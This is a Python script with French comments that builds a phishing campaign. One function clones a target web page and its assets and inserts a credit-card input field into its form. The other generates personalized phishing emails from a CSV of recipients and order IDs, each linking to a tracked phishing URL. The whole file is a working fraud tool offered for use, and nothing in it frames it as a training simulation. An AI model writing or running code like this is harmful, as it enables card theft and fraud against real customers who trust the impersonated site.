import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import csv
from jinja2 import Template

def clone_web_page(url, output_dir):
    # Créer les répertoires nécessaires
    os.makedirs(output_dir, exist_ok=True)
    static_dir = os.path.join(output_dir, 'static')
    os.makedirs(static_dir, exist_ok=True)

    # Télécharger la page HTML
    response = requests.get(url)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, 'html.parser')

    # Télécharger et remplacer les liens des ressources (images, CSS, JS)
    for tag, attr in [('img', 'src'), ('link', 'href'), ('script', 'src')]:
        for resource in soup.find_all(tag):
            if resource.has_attr(attr):
                resource_url = urljoin(url, resource[attr])
                resource_name = os.path.basename(urlparse(resource_url).path)
                resource_path = os.path.join(static_dir, resource_name)

                # Télécharger la ressource
                try:
                    res = requests.get(resource_url)
                    res.raise_for_status()
                    with open(resource_path, 'wb') as f:
                        f.write(res.content)
                    # Modifier le lien dans la page
                    resource[attr] = f'static/{resource_name}'
                except Exception as e:
                    print(f"Erreur lors du téléchargement de {resource_url}: {e}")

    # Ajouter un champ de carte de crédit dans le formulaire
    form = soup.find('form')
    if form:
        credit_card_input = soup.new_tag('input', type='text', name='credit_card', required=True)
        form.append(credit_card_input)

    # Sauvegarder la page modifiée
    with open(os.path.join(output_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(str(soup))

    print(f"Page clonée et sauvegardée dans {output_dir}")

def generate_phishing_emails(csv_path, template_path, output_dir, phishing_url):
    # Créer le répertoire de sortie
    os.makedirs(output_dir, exist_ok=True)

    # Charger le template d'email
    with open(template_path, 'r', encoding='utf-8') as template_file:
        template_content = template_file.read()
    template = Template(template_content)

    # Lire le fichier CSV et générer les emails
    with open(csv_path, 'r', encoding='utf-8') as csv_file:
        reader = csv.DictReader(csv_file)
        for row in reader:
            email_content = template.render(
                destinataires=row['destinataires'],
                adresse=row['adresse'],
                commande_id=row['commande_id'],
                phishing_url=f"{phishing_url}?commande_id={row['commande_id']}"
            )

            # Sauvegarder l'email
            email_filename = f"{row['commande_id']}.html"
            email_path = os.path.join(output_dir, email_filename)
            with open(email_path, 'w', encoding='utf-8') as email_file:
                email_file.write(email_content)

            print(f"Email généré pour {row['destinataires']} : {email_path}")